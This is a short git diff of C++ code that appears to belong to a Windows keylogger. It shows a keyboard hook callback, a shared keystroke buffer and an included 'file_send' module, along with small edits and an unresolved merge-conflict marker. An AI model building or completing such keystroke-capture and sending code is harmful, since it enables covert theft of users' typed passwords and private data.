@@ -1,16 +1,17 @@
 #define _WIN32_WINNT 0x0500
 #include <fstream>
-
 #include "file_send.cpp"
 #include "timer.cpp"
 
-#include <windows.h>
+// #include <windows.h>
 
 using namespace std;
 
 extern int counter;
 extern std::mutex mtx;
-extern string buffer;
+
+extern bool ready;
+extern std::string buffer;
 
 LRESULT CALLBACK keyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam)
 {
@@ -128,7 +129,10 @@ LRESULT CALLBACK keyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam)
         mtx.unlock();
     }
 
+<<<<<<< HEAD
 
+=======
+>>>>>>> d04c6d211a22e4aa3a1ed2f17270a6d7afbb6635
     return CallNextHookEx(NULL, nCode, wParam, lParam);
 }
 
